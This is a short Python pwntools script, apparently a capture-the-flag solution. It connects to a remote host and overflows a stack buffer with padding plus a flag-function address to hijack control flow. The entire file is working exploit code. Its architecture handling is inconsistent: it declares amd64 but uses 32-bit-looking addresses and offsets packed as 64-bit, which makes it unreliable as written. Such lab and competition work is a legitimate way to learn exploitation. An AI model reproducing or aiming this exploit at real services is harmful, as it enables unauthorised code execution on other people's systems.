#!/usr/bin/python
from pwn import *

context.arch = "amd64"
r = remote("124.16.75.117", 51002)
# r = process("./vuln")
r.recvuntil(b"Give me a string and lets see what happens: ")
flag_function_addr = 0x080491F6
buf_len = 0x44
ebx_offset = 0x4
ebp_offset = 0x4
padding_len = buf_len + ebx_offset + ebp_offset
r.sendline(b"A" * padding_len + p64(flag_function_addr))
r.interactive()
